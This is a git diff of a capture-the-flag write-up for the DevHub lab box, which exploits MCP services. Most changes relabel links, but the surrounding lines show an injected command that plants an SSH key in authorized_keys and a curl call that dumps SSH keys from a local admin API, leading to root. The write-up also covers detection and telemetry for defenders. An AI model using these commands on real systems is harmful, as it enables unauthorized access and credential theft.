@@ -60,10 +60,6 @@ DevHub is an Ubuntu machine centered around the **Model Context Protocol (MCP)**
 [Network_Map](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/DevHub/nmap_results.nmap "Results")
 
 
-![DevHub](htb_dev_area_MIndmap.png))
-
-
-
 ### Web Enumeration
 
 For the **Enumeration → Port Scan** section, expand it with the information you actually observed during the box:
@@ -110,7 +106,7 @@ MCPJam Inspector exposes a `POST /api/mcp/connect` endpoint that accepts a `serv
 }
 ```
 
-[Network_Map](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/DevHub/test.json "Results")
+[test.json](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/DevHub/test.json "Results")
 
 The MCPJam server responds with a 500 ("Connection closed") because bash doesn't speak MCP protocol - but the command executes before bash exits.
 
@@ -123,7 +119,7 @@ The MCPJam server responds with a 500 ("Connection closed") because bash doesn't
 CMD="mkdir -p /home/mcp-dev/.ssh && echo 'ssh-ed25519 AAAA...' >> /home/mcp-dev/.ssh/authorized_keys && chmod 600 /home/mcp-dev/.ssh/authorized_keys"
 ```
 
-[Network_Map](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/DevHub/ssh.json "Results")
+[ssh.json ](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/DevHub/ssh.json "Results")
 
 
 ![DevHub](htb_Devhub_web_ssh_json.png)
@@ -144,7 +140,7 @@ We now have a shell as **mcp-dev** (uid=1001).
 
 ### OPSMCP Discovery
 
-[Network_Map](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/DevHub/ps.txt "Results")
+[ps.txt](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/DevHub/ps.txt "Results")
 
 Port 5000 (localhost) runs OPSMCP, a custom Flask/Python MCP server. Its API requires an `X-API-Key` header:
 
@@ -199,8 +195,10 @@ Upload and execute via MCPJam RCE:
 
 The command runs as `analyst` inside JupyterLab's terminal, copying `server.py` to a world-readable location.
 
-[Network_Map](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/DevHub/notebook.json "Results")
-[Network_Map](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/DevHub/quarterly_analysis.ipynb "Results")
+[notebook.json ](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/DevHub/notebook.json "Results")
+
+
+[quarterly_analysis.ipynb](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/DevHub/quarterly_analysis.ipynb "Results")
 
 ### Extracting the API Key
 
@@ -240,7 +238,7 @@ curl -X POST http://127.0.0.1:5000/tools/call \
   -d '{"name": "ops._admin_dump", "arguments": {"target": "ssh_keys", "confirm": true}}'
 ```
 
-[Network_Map](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/DevHub/dump.json "Results")
+[dump.json ](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/DevHub/dump.json "Results")
 
 
 Response:
@@ -252,7 +250,7 @@ Response:
 }
 ```
 
-[Network_Map](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/DevHub/root_id_rsa "Results")
+[root_id_rsa](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/DevHub/root_id_rsa "Results")
 
 
 > **Note:** The `arguments` key is critical - using `parameters` returns "Tool name required".
@@ -343,9 +341,10 @@ uid=0(root) gid=0(root) groups=0(root)
 
 * **Telemetry Gap Analysis:** Requires process creation logging, SSH authentication monitoring, API request auditing for MCP services, file access telemetry for sensitive keys, and localhost HTTP access visibility.
 
-[Network_Map](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/DevHub/forensics.sh "Results")
+[forensics.sh](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/DevHub/forensics.sh "Results")
 
-[Network_Map](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/DevHub/forensics_devhub*20260531*032651.tar.gz "Results")
+
+[forensics_devhub*20260531*032651.tar.gz](https://raw.githubusercontent.com/0x0z0n/Research/refs/heads/main/posts/DevHub/forensics_devhub*20260531*032651.tar.gz "Results")
 
 * **Detection-as-Code (KQL):**
 
